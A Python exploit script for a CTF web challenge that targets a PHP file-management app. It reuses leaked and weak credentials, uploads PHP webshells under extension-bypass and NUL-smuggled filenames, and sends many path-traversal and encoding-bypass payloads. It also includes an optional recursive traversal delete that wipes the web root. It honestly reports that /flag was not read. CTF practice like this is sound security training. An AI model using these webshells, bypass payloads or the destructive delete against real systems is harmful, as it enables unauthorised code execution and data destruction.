#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py -- 2026 湾区杯决赛 环节二 web02 「文件管理系统」复现脚本 (restoration build)

Purpose
-------
Reproduce the AUTHENTIC exploitation chain observed live during the competition,
printing raw evidence at every step, and honestly report whether the read path
to /flag is reachable.

It is deliberately NON-destructive by default: `?delete=` is the one primitive in
this challenge that really works (recursive path traversal delete), and it only
DESTROYS -- it can never read.  Use --allow-destructive to actually exercise it.

This script NEVER fabricates a flag.  A `flag{...}` string is only ever printed
when it was literally received in an HTTP response body from the target.

Usage
-----
    python solve.py --target http://192.168.48.211:4999
    python solve.py --target http://192.168.48.211:4999 --cmd id
    python solve.py --target http://192.168.48.211:4999 --allow-destructive   # DESTRUCTIVE

Exit codes
----------
    0 = /flag was genuinely read (printed)
    2 = NOT SOLVED -- the read path is sealed (expected / matches the original)
    3 = dependency or connectivity problem
"""

from __future__ import print_function

import argparse
import io
import os
import re
import struct
import sys
import uuid
import zlib

try:
    import requests
except ImportError:  # pragma: no cover
    sys.stderr.write("[-] missing dependency: pip install -r requirements.txt\n")
    sys.exit(3)


# --------------------------------------------------------------------------- #
# infrastructure
# --------------------------------------------------------------------------- #
FLAG_RE = re.compile(rb"flag\{[!-~]{1,200}?\}")

# every response body we actually received; scanned at the end for a real flag
RECEIVED = []


def hr(title=""):
    print("")
    print("=" * 78)
    if title:
        print("== " + title)
        print("=" * 78)


def sub(title):
    print("")
    print("-- " + title)


def make_session():
    """requests.Session that ignores HTTP(S)_PROXY / NO_PROXY (harness rule)."""
    s = requests.Session()
    s.trust_env = False
    s.proxies = {}
    s.headers.update({"User-Agent": "web02-restoration/1.0"})
    return s


def fetch(sess, method, url, auth=None, allow_redirects=False, **kw):
    """Single request helper. Returns the Response, records the body."""
    try:
        r = sess.request(method, url, auth=auth, allow_redirects=allow_redirects,
                         timeout=15, **kw)
    except requests.RequestException as exc:
        print("    [!] request failed: %s %s -> %s" % (method, url, exc))
        return None
    RECEIVED.append((method + " " + url, r.content))
    return r


def body_repr(b, limit=70):
    """repr-ish prefix of a body, ASCII-safe."""
    txt = b[:limit]
    out = ""
    for ch in txt:
        c = chr(ch) if isinstance(ch, int) else ch
        if 32 <= ord(c) < 127:
            out += c
        elif c == "\n":
            out += "\\n"
        elif c == "\r":
            out += "\\r"
        else:
            out += "\\x%02x" % ord(c)
    if len(b) > limit:
        out += "..."
    return out


def assert_eq(label, got, want):
    if got == want:
        print("    [OK]   %s == %r" % (label, want))
        return True
    print("    [FAIL] %s == %r (expected %r)" % (label, got, want))
    return False


def assert_true(label, cond, detail=""):
    if cond:
        print("    [OK]   %s %s" % (label, detail))
        return True
    print("    [FAIL] %s %s" % (label, detail))
    return False


# --------------------------------------------------------------------------- #
# payload builders
# --------------------------------------------------------------------------- #
# Minimal but genuinely valid baseline JPEG (SOI + APP0/JFIF + fake tables + EOI).
# finfo reports image/jpeg and getimagesize() accepts it (SOI marker present).
MINIMAL_JPEG = (
    b"\xff\xd8\xff\xe0"                     # SOI + APP0
    b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xdb\x00\x43\x00"                 # DQT
    + b"\x08" * 64 +
    b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"   # SOF0 1x1
    b"\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03"
    b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"                # SOS
    b"\x00\x00"                                                # trivial entropy data
    b"\xff\xd9"                                                # EOI
)


def _png_chunk(tag, data):
    return (struct.pack(">I", len(data)) + tag + data
            + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF))


# A genuinely valid 1x1 grayscale PNG: signature + IHDR + IDAT + IEND.
MINIMAL_PNG = (
    b"\x89PNG\r\n\x1a\n"
    + _png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0))
    + _png_chunk(b"IDAT", zlib.compress(b"\x00\x00"))
    + _png_chunk(b"IEND", b"")
)


def build_payloads(cmd):
    php_blob = ("<?php echo shell_exec($_GET['c']); ?>").encode()
    php_blob2 = ("<?php echo system('%s'); ?>" % cmd).encode()
    return [
        # (filename, bytes, declared content-type)
        ("ok.jpg",      MINIMAL_JPEG,                            "image/jpeg"),
        ("ok2.png",     MINIMAL_PNG,                             "image/png"),
        ("ok.zip",      b"PK\x03\x04" + b"\x14\x00\x00\x00" + b"\x00" * 24, "application/zip"),
        ("poly.jpg",    b"GIF89a" + php_blob,                     "image/gif"),
        ("shell.php",   php_blob2,                                "application/x-php"),
        ("shell.phtml", php_blob2,                                "application/x-php"),
        ("shell.php.jpg", php_blob2,                              "image/jpeg"),
        ("shell.jpg.php", php_blob2,                              "image/jpeg"),
        ("shell.pHp.jpg", php_blob2,                              "image/jpeg"),
        ("shell.php%00.jpg", php_blob2,                           "image/jpeg"),
        ("shell_.jpg",  MINIMAL_JPEG,                             "image/jpeg"),   # '_' -> not downloadable
    ]


def raw_multipart(field, filename_bytes, data, content_type="application/octet-stream"):
    """Hand-built multipart body so a raw NUL byte can be smuggled into the filename."""
    boundary = "----web02%s" % uuid.uuid4().hex
    body = b"".join([
        b"--" + boundary.encode() + b"\r\n",
        b'Content-Disposition: form-data; name="' + field.encode() + b'"; filename="'
        + filename_bytes + b'"\r\n',
        b"Content-Type: " + content_type.encode() + b"\r\n\r\n",
        data,
        b"\r\n",
        b"--" + boundary.encode() + b"--\r\n",
    ])
    return body, "multipart/form-data; boundary=" + boundary


def extract_files_from_admin(html):
    """Pull the server-rendered file table out of the admin page."""
    rows = re.findall(r"download\.php\?file=([^\"']+)", html)
    return [requests.utils.unquote(x) for x in rows]


# --------------------------------------------------------------------------- #
# steps
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser(
        description="web02 (文件管理系统) restoration solve / evidence script")
    ap.add_argument("--target", default="http://192.168.48.211:4999",
                    help="base URL of the target (default: http://192.168.48.211:4999)")
    ap.add_argument("--cmd", default="id",
                    help="command embedded in uploaded webshell payloads (default: id)")
    ap.add_argument("--allow-destructive", action="store_true", default=False,
                    help="actually invoke admin.php?delete= (recursive path-traversal "
                         "delete; DESTROYS the container instance). OFF by default.")
    args = ap.parse_args()

    target = args.target.rstrip("/")
    cmd = args.cmd
    sess = make_session()

    print("web02 restoration -- target=%s cmd=%r" % (target, cmd))
    print("destructive mode: %s" % ("ON  (will really delete)" if args.allow_destructive
                                    else "off (safe, read-only probing)"))

    findings = {}

    # ------------------------------------------------------------------ 1 ---
    hr("1. GET /index.php -- info leak in an HTML comment")
    r = fetch(sess, "GET", target + "/index.php")
    if r is None:
        print("[!] target unreachable -- is the container up on port 8090?")
        return 3
    print("    HTTP %s  (%d bytes)" % (r.status_code, len(r.content)))
    m = re.search(r"<!--\s*([^\s<>]*?/[^\s<>]*?)\s*-->", r.text)
    if m:
        print("    [!] LEAKED CREDENTIALS COMMENT: <!-- %s -->" % m.group(1))
        findings["leak_comment"] = m.group(1)
    else:
        print("    [FAIL] no credential comment found")
    t = re.search(r"<title>(.*?)</title>", r.text, re.S)
    print("    <title> = %r" % (t.group(1) if t else None))

    # ------------------------------------------------------------------ 2 ---
    hr("2. POST /index.php -- authenticate, expect 302 -> /demo.php")
    r = fetch(sess, "POST", target + "/index.php",
              data={"user": "user", "passwd": "123"})
    print("    HTTP %s" % (r.status_code if r else "?"))
    if r is not None:
        print("    Location: %s" % r.headers.get("Location"))
        assert_eq("status", r.status_code, 302)
        assert_eq("Location", r.headers.get("Location"), "/demo.php")

    sub("negative control: wrong credentials must NOT redirect")
    r = fetch(sess, "POST", target + "/index.php",
              data={"user": "user", "passwd": "wrong"})
    if r is not None:
        print("    HTTP %s  Location=%r" % (r.status_code, r.headers.get("Location")))
        assert_true("no redirect on bad creds", r.headers.get("Location") is None)

    sub("follow the redirect to /demo.php")
    r = fetch(sess, "GET", target + "/demo.php")
    if r is not None:
        print("    HTTP %s  body=%r  len=%d" % (r.status_code, r.content, len(r.content)))
        assert_eq("demo.php body", r.content, b"flag is not here")

    sub("/demo.php with arbitrary params and methods -- always the same 16 bytes")
    for meth, kw in (("GET", {}), ("POST", {"data": {"a": "b"}}), ("PUT", {"data": "x"})):
        rr = fetch(sess, meth, target + "/demo.php?x=1&file=../../../../flag", **kw)
        if rr is not None:
            print("    %-4s -> %s %r" % (meth, rr.status_code, rr.content))
            assert_eq("unchanged body", rr.content, b"flag is not here")

    # ------------------------------------------------------------------ 3 ---
    hr("3. /admin.php -- HTTP Basic Auth (weak admin:admin123)")
    r = fetch(sess, "GET", target + "/admin.php")
    if r is not None:
        print("    no auth  -> HTTP %s  WWW-Authenticate=%r"
              % (r.status_code, r.headers.get("WWW-Authenticate")))
        assert_eq("status without auth", r.status_code, 401)

    for u, p in (("admin", "admin"), ("admin", "password"), ("admin", "admin123")):
        rr = fetch(sess, "GET", target + "/admin.php", auth=(u, p))
        if rr is not None:
            print("    %s:%-10s -> HTTP %s" % (u, p, rr.status_code))

    r = fetch(sess, "GET", target + "/admin.php", auth=("admin", "admin123"))
    if r is None or r.status_code != 200:
        print("[!] cannot enter admin.php -- aborting")
        return 2
    t = re.search(r"<title>(.*?)</title>", r.text, re.S)
    print("    HTTP 200  (%d bytes)" % len(r.content))
    print("    <title> = %r" % (t.group(1) if t else None))
    assert_eq("status with admin:admin123", r.status_code, 200)
    assert_true("title is the FMS admin page",
                t is not None and "\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf" in t.group(1))
    assert_true("upload button present", "\u786e\u8ba4\u4e0a\u4f20" in r.text)
    assert_true("thead Name/Size/Modified/Actions present",
                all(h in r.text for h in ("Name", "Size", "Modified", "Actions")))
    findings["admin"] = True

    # ------------------------------------------------------------------ 4 ---
    hr("4. admin.php?delete= -- UNFILTERED recursive path traversal (probe only)")
    probe_name = "web02_probe_not_exist_%s" % uuid.uuid4().hex[:8]
    traversal = "..%2f..%2f..%2ftmp%2f" + probe_name      # -> /tmp/<probe>, does not exist
    print("    Non-destructive probes. Both leaf paths DO NOT EXIST, so rrmdir()")
    print("    only performs a failing @unlink() -- nothing on the target is touched.")

    for label, val in (("plain (safe, no traversal)", probe_name),
                       ("traversal proof (safe leaf)", traversal)):
        url = target + "/admin.php?delete=" + val
        rr = fetch(sess, "GET", url, auth=("admin", "admin123"))
        if rr is None:
            continue
        echoed = re.findall(r"\u5df2\u5220\u9664:\s*([^<\n]+)", rr.text)
        print("    %-28s HTTP %s  echoed=%r"
              % (label, rr.status_code, echoed[0].strip() if echoed else None))
        if echoed:
            findings["delete_echo"] = echoed[0].strip()

    if findings.get("delete_echo"):
        print("    [!!] server echoed the concatenated path verbatim -> the parameter is")
        print("         NOT filtered:  '/var/www/uploads/' . $_GET['delete']")
        print("         => `?delete=..` recurses over /var/www (line ~110 rmdir('/var/www/html'),")
        print("            line ~115 rmdir('/var/www/uploads/..')).")
        print("         => This primitive can only DESTROY; it has no read-back channel.")

    if args.allow_destructive:
        sub("--allow-destructive given: exercising the real traversal")
        print("    [!!] sending ?delete=..  (this will wipe /var/www on the target)")
        rr = fetch(sess, "GET", target + "/admin.php?delete=..", auth=("admin", "admin123"))
        print("    HTTP %s" % (rr.status_code if rr else "?"))
        rr = fetch(sess, "GET", target + "/admin.php", auth=("admin", "admin123"))
        print("    admin.php after delete -> HTTP %s" % (rr.status_code if rr else "?"))
    else:
        print("    (destructive call NOT sent -- pass --allow-destructive to really do it)")

    # ------------------------------------------------------------------ 5 ---
    hr("5. download.php?file= -- strict character whitelist ^[a-zA-Z0-9.]+$")
    print("    %-46s %-6s %s" % ("payload", "HTTP", "body prefix"))
    print("    " + "-" * 74)
    dl_probes = [
        ("/etc/passwd",                        "/download.php?file=/etc/passwd"),
        ("..%2f..%2fflag",                     "/download.php?file=..%2f..%2fflag"),
        ("....//....//flag",                   "/download.php?file=....//....//flag"),
        ("%2e%2e%2f%2e%2e%2fflag",             "/download.php?file=%2e%2e%2f%2e%2e%2fflag"),
        ("..%5c..%5cflag (backslash)",         "/download.php?file=..%5c..%5cflag"),
        ("../../../../flag (raw dots)",        "/download.php?file=../../../../flag"),
        ("flag",                               "/download.php?file=flag"),
        ("flag.txt",                           "/download.php?file=flag.txt"),
        ("file[]=flag (array)",                "/download.php?file[]=flag"),
        ("flag%00.txt (NUL)",                  "/download.php?file=flag%00.txt"),
        ("flag%2500.txt (double-encoded NUL)", "/download.php?file=flag%2500.txt"),
        ("a-b.jpg ('-' char)",                 "/download.php?file=a-b.jpg"),
        ("a_b.jpg ('_' char)",                 "/download.php?file=a_b.jpg"),
    ]
    for label, path in dl_probes:
        rr = fetch(sess, "GET", target + path)
        if rr is None:
            print("    %-46s %-6s %s" % (label, "ERR", ""))
            continue
        print("    %-46s %-6s %s" % (label, rr.status_code, body_repr(rr.content, 40)))
    print("    " + "-" * 74)
    print("    verdict: '/' , '\\\\' , '_' , '-' , '%' and NUL are all rejected outright;")
    print("             traversal is impossible because the separator itself is filtered.")
    print("             Uploaded names containing '_' or '-' are therefore UNDOWNLOADABLE")
    print("             (faithful to the original -- a real usability bug in the challenge).")

    # ------------------------------------------------------------------ 6 ---
    hr("6. upload.php-equivalent -- extension whitelist + content sniffing")
    print("    whitelist: jpg / jpeg / png / zip  |  content must MATCH extension")
    print("    filename charset: ^[A-Za-z0-9._-]+$  |  destination: /var/www/uploads/")
    print("")
    print("    %-22s %-26s %-6s %s" % ("filename", "declared type", "HTTP", "server verdict"))
    print("    " + "-" * 96)

    settled = []
    for name, data, ctype in build_payloads(cmd):
        rr = sess.post(target + "/admin.php", auth=("admin", "admin123"),
                       files={"file": (name, data, ctype)},
                       allow_redirects=True, timeout=20)
        RECEIVED.append(("POST /admin.php file=" + name, rr.content))
        verdict = "?"
        for pat in (r"\u4e0a\u4f20\u6210\u529f:\s*([^<\n]+)",
                    r"\u4e0a\u4f20\u5931\u8d25[^<\n]*"):
            mm = re.search(pat, rr.text)
            if mm:
                verdict = mm.group(0).strip()
                break
        print("    %-22s %-26s %-6s %s" % (name, ctype, rr.status_code, verdict))
        if verdict.startswith("\u4e0a\u4f20\u6210\u529f"):
            settled.append(name)

    print("    " + "-" * 96)
    print("    accepted uploads: %s" % (settled or "none"))

    sub("server-rendered file table (admin.php) after the uploads")
    r = fetch(sess, "GET", target + "/admin.php", auth=("admin", "admin123"))
    listed = extract_files_from_admin(r.text) if r is not None else []
    print("    files listed: %s" % (listed or "[]  (\u6ca1\u6709\u6587\u4ef6)"))
    findings["listed"] = listed

    sub("download the uploads that the whitelist permits")
    for name in sorted(set(listed) & set(settled)) if listed else []:
        rr = fetch(sess, "GET", target + "/download.php?file=" + name)
        if rr is None:
            continue
        print("    ?file=%-20s HTTP %-4s %d bytes  magic=%s"
              % (name, rr.status_code, len(rr.content),
                 body_repr(rr.content, 6) if rr.status_code == 200 else "-"))

    sub("can an uploaded PHP payload execute?")
    exec_attempts = [
        "/uploads/shell.php?c=" + cmd,
        "/uploads/shell.phtml?c=" + cmd,
        "/uploads/shell.php.jpg?c=" + cmd,
        "/shell.php?c=" + cmd,
        "/download.php?file=shell.php",
    ]
    for path in exec_attempts:
        rr = fetch(sess, "GET", target + path)
        if rr is None:
            continue
        marker = cmd.encode() in rr.content
        print("    %-42s HTTP %-4s len=%-6d contains %r output: %s"
              % (path, rr.status_code, len(rr.content), cmd, marker))
    print("    verdict: no PHP executes from /var/www/uploads (php_admin_flag engine off)")
    print("             and archives are never auto-extracted.")

    # ------------------------------------------------------------------ 7 ---
    hr("7. attempt to read /flag through every primitive discovered")
    read_attempts = [
        "/download.php?file=../../../../flag",
        "/download.php?file=..%2f..%2f..%2f..%2fflag",
        "/download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag",
        "/download.php?file=..%252f..%252f..%252f..%252fflag",
        "/download.php?file=....//....//....//....//flag",
        "/download.php?file=..%c0%af..%c0%af..%c0%af..%c0%afflag",
        "/download.php?file=..%5c..%5c..%5c..%5cflag",
        "/download.php?file=/flag",
        "/download.php?file=flag",
        "/download.php?file=flag%00",
        "/download.php?file[]=../../../../flag",
        "/flag",
        "/flag.txt",
        "/uploads/flag",
        "/uploads/../flag",
        "/demo.php?file=../../../../flag",
        "/index.php?file=../../../../flag",
    ]
    # the 8 read-parameter candidates probed on the live target; all came back empty
    for p in ("view", "path", "dir", "folder", "cd", "directory", "root",
              "base", "current", "file", "read", "download", "src"):
        read_attempts.append("/admin.php?%s=/flag" % p)

    print("    %-52s %-6s %s" % ("attempt", "HTTP", "body prefix"))
    print("    " + "-" * 88)
    for path in read_attempts:
        rr = fetch(sess, "GET", target + path, auth=("admin", "admin123"))
        if rr is None:
            continue
        print("    %-52s %-6s %s" % (path, rr.status_code, body_repr(rr.content, 30)))
    print("    " + "-" * 88)
    print("    NOTE: admin.php read-parameter probes are sent WITH valid basic auth on")
    print("          purpose, so a 401 cannot mask a hit. No parameter reads a file.")
    print("          ?delete= was NEVER able to read anything -- it is destroy-only.")

    # ---------------------------------------------------------------- result
    hr("RESULT -- scanning every byte we actually received for a real flag")
    hit = None
    for label, body in RECEIVED:
        m = FLAG_RE.search(body)
        if m:
            hit = (label, m.group(0).decode("ascii", "replace"))
            break

    if hit:
        print("[+] FLAG READ FROM TARGET (%s):" % hit[0])
        print("    " + hit[1])
        return 0

    print("[!] NOT SOLVED -- read path sealed (this matches the original competition result)")
    print("")
    print("    Evidence chain reproduced successfully:")
    print("      * index.php leaks <!-- user/123 -->                     -> weak creds")
    print("      * POST user=user&passwd=123 -> 302 /demo.php            -> works")
    print("      * /demo.php always returns 'flag is not here'           -> decoy hint")
    print("      * /admin.php Basic admin:admin123                       -> real FMS panel")
    print("      * upload: whitelist + content sniff + basename()        -> no PHP lands")
    print("      * /var/www/uploads is outside the docroot & PHP is off  -> no execution")
    print("      * download.php ^[a-zA-Z0-9.]+$ rejects '/'              -> NO traversal")
    print("      * admin.php?delete= is unfiltered traversal but WRITE-ONLY (destroy)")
    print("")
    print("    There is no read primitive. /flag is unreachable from this application")
    print("    as implemented; this reconstruction stays faithful to that and does NOT")
    print("    add an artificial ?view=/?path= backdoor.")
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
